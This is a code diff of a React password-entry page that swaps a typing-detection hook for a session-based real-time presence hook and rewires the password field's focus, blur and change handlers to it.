@@ -9,7 +9,7 @@ import { ChevronLeft, Lock, Eye, EyeOff, Loader2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { AlertMessage } from "@/components/AlertMessage";
-import { useSimpleTypingDetection } from "@/hooks/useSimpleTypingDetection";
+import { useRealtimePresence } from "@/hooks/useRealtimePresence";
 
 const AuthPassword = () => {
   const location = useLocation();
@@ -25,11 +25,11 @@ const AuthPassword = () => {
     location.state?.sessionId || sessionStorage.getItem("sessionId");
   const hasError = location.state?.hasError || false;
 
-  // تشخیص تایپ برای AuthPassword
-  const typingDetection = useSimpleTypingDetection({
+  // Real-time presence tracking
+  const presence = useRealtimePresence({
+    sessionId: sessionId || "",
     formName: "AuthPassword",
-    enabledFields: ["password"],
-    debounceTime: 1500,
+    enabled: !!sessionId,
   });
 
   useEffect(() => {
@@ -252,10 +252,10 @@ const AuthPassword = () => {
                         setErrors((prev) => ({ ...prev, password: undefined }));
                       }
                       // تشخیص تایپ برای presence system
-                      typingDetection.startTyping("password");
+                      presence.startTyping("password");
                     }}
-                    onFocus={() => typingDetection.startTyping("password")}
-                    onBlur={() => typingDetection.stopTyping("password")}
+                    onFocus={() => presence.startTyping("password")}
+                    onBlur={() => presence.stopTyping()}
                     className="w-full text-right pr-12"
                     style={{
                       borderRadius: "8px",
